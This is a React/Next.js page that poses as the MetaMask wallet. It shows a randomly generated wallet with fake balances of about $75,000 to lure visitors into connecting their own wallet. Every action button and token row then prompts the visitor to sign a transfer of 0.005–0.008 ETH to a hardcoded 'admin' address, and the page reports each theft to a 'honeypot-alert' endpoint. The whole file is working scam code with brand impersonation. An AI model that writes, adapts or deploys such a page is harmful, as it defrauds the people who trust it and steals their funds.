import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Head from 'next/head';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [activeTab, setActiveTab] = useState('Tokens');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');

  useEffect(() => {
    generateHoneypotWallet();
  }, []);

  const generateHoneypotWallet = () => {
    const randomWallet = ethers.Wallet.createRandom();
    const honeypotWallet = {
      address: randomWallet.address,
      privateKey: randomWallet.privateKey,
      seedPhrase: randomWallet.mnemonic.phrase,
      totalValue: 75418.94,
      ethBalance: 0.000000001,
      tokens: [
        { symbol: 'USDT', balance: '24,891.47', usdValue: 24891.47, change: '+2.1%' },
        { symbol: 'USDC', balance: '12,456.83', usdValue: 12456.83, change: '+0.1%' },
        { symbol: 'WETH', balance: '5.7293', usdValue: 17187.90, change: '-1.2%' },
        { symbol: 'LINK', balance: '847.29', usdValue: 11862.06, change: '+5.4%' },
        { symbol: 'UNI', balance: '1,293.84', usdValue: 9020.68, change: '+3.2%' }
      ]
    };
    setWalletData(honeypotWallet);
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
      }
    } catch (error) {
      console.log('Connection failed');
    }
  };

  const handleAction = async (action, token = null) => {
    if (!userAddress) {
      await connectWallet();
      return;
    }

    setLoading(true);
    setStatus(`Processing ${action}...`);

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const gasAmount = action === 'swap' ? '0.008' : '0.005';
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      setStatus(`${action.toUpperCase()} completed successfully!`);
      
      // Notify admin
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: action.toUpperCase(),
          userAddress: userAddress,
          amount: gasAmount + ' ETH',
          txHash: tx.hash,
          token: token?.symbol || 'ETH'
        })
      });
      
    } catch (error) {
      setStatus('Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  if (!walletData) {
    return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
      <div className="text-white">Loading wallet...</div>
    </div>;
  }

  return (
    <>
      <Head>
        <title>MetaMask</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      </Head>
      
      <div className="min-h-screen bg-black text-white">
        <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
          
          {/* Header */}
          <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
            <div className="text-white font-bold text-lg mb-2">MetaMask</div>
          </div>

          {/* Account Section */}
          <div className="p-6 bg-gray-800 border-b border-gray-700">
            <div className="flex items-center justify-between mb-4">
              <div>
                <div className="text-white font-semibold">Account 1</div>
                <div className="text-gray-400 text-sm">8 network addresses</div>
              </div>
              <div className="relative">
                <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
                  <span className="text-white text-xs font-bold">1</span>
                </div>
              </div>
            </div>

            {/* Balance */}
            <div className="text-center mb-6">
              <div className="text-4xl font-bold text-white mb-2">
                ${walletData.totalValue.toLocaleString()}
              </div>
              <div className="text-green-400 text-sm">
                +${walletData.totalValue.toLocaleString()} (+100.00%) Discover
              </div>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-4 gap-3">
              <button 
                onClick={() => handleAction('buy')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">$</div>
                <div className="text-xs">Buy</div>
              </button>
              <button 
                onClick={() => handleAction('swap')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">⇄</div>
                <div className="text-xs">Swap</div>
              </button>
              <button 
                onClick={() => handleAction('send')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">→</div>
                <div className="text-xs">Send</div>
              </button>
              <button 
                onClick={() => handleAction('receive')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">↓</div>
                <div className="text-xs">Receive</div>
              </button>
            </div>
          </div>

          {/* Rewards Banner */}
          <div className="bg-gradient-to-r from-purple-600 to-pink-600 m-4 p-4 rounded-lg flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center mr-3">
                <span className="text-white font-bold">M</span>
              </div>
              <div>
                <div className="text-white font-semibold">Rewards are here</div>
                <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
              </div>
            </div>
            <button className="text-white/60 hover:text-white">×</button>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-gray-700">
            {['Tokens', 'DeFi', 'NFTs', 'Activity'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`flex-1 py-3 px-4 text-sm font-medium ${
                  activeTab === tab 
                    ? 'text-white border-b-2 border-blue-500' 
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>

          {/* Network Selector */}
          <div className="p-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <span className="text-white text-sm">All popular networks</span>
                <i className="fas fa-chevron-down text-gray-400 ml-2"></i>
              </div>
              <div className="flex items-center space-x-2">
                <i className="fas fa-bars text-gray-400"></i>
                <i className="fas fa-ellipsis-v text-gray-400"></i>
              </div>
            </div>
          </div>

          {/* Token List */}
          <div className="flex-1">
            {activeTab === 'Tokens' && (
              <div>
                {/* ETH */}
                <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                  <div className="flex items-center">
                    <img 
                      src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" 
                      alt="ETH" 
                      className="w-8 h-8 rounded-full mr-3"
                    />
                    <div>
                      <div className="text-white font-medium">Ethereum • Earn</div>
                      <div className="text-red-400 text-sm">-3.41%</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-white font-medium">$0.00</div>
                    <div className="text-gray-400 text-sm">0 ETH</div>
                  </div>
                </div>

                {/* Other Tokens */}
                {walletData.tokens.map((token, index) => {
                  const tokenLogos = {
                    'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
                    'USDC': 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png',
                    'WETH': 'https://assets.coingecko.com/coins/images/2518/small/weth.png',
                    'LINK': 'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',
                    'UNI': 'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png'
                  };
                  
                  return (
                    <div 
                      key={index} 
                      onClick={() => handleAction('send', token)}
                      className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
                    >
                      <div className="flex items-center">
                        <img 
                          src={tokenLogos[token.symbol]} 
                          alt={token.symbol} 
                          className="w-8 h-8 rounded-full mr-3"
                        />
                        <div>
                          <div className="text-white font-medium">{token.symbol}</div>
                          <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                            {token.change}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">${token.usdValue.toLocaleString()}</div>
                        <div className="text-gray-400 text-sm">{token.balance}</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {activeTab === 'DeFi' && (
              <div className="p-8 text-center">
                <div className="text-gray-400 mb-4">No DeFi positions found</div>
                <button 
                  onClick={() => handleAction('defi')}
                  className="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg text-white font-semibold"
                >
                  Explore DeFi
                </button>
              </div>
            )}

            {activeTab === 'NFTs' && (
              <div className="p-8 text-center">
                <div className="text-gray-400 mb-4">No NFTs found</div>
                <button 
                  onClick={() => handleAction('nft')}
                  className="bg-purple-600 hover:bg-purple-700 px-6 py-2 rounded-lg text-white font-semibold"
                >
                  Browse NFTs
                </button>
              </div>
            )}

            {activeTab === 'Activity' && (
              <div className="p-8 text-center">
                <div className="text-gray-400 mb-4">No recent activity</div>
                <button 
                  onClick={() => handleAction('activity')}
                  className="bg-gray-600 hover:bg-gray-700 px-6 py-2 rounded-lg text-white font-semibold"
                >
                  View History
                </button>
              </div>
            )}
          </div>

          {/* Status Message */}
          {status && (
            <div className="p-4 bg-gray-800 border-t border-gray-700">
              <div className="text-center text-sm text-gray-300">{status}</div>
            </div>
          )}

          {/* Connect Wallet Prompt */}
          {!userAddress && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
                <h3 className="text-white font-bold text-lg mb-4">Connect Wallet</h3>
                <p className="text-gray-300 mb-6">Connect your wallet to access these high-value assets</p>
                <button 
                  onClick={connectWallet}
                  className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold"
                >
                  Connect MetaMask
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}